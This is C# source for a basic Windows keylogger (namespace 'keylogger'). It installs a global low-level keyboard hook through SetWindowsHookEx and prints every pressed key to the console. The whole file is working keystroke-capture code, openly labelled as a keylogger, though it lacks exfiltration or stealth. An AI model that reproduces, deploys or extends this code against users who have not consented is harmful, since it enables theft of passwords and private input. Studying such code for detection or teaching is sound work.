using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

namespace keylogger
{
    class Porgram
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallBack;



        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);

        }


        //declaring our LowLevelKeyboardProc
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.Out.Write((Keys)vkCode);
            }

            //returning the callnexthookfunctionex is recommended by microsoft
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        //defining our sethook function
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        //importing the CallNextHookEx function using the user32.dll
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        //importing the SetWindowsHookEx function from user32.dll
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        //importing the UnhookWindowsHookEx function from user32.dll
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //importing GetModuleHandle function from the kernel132.dll
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);


    }
}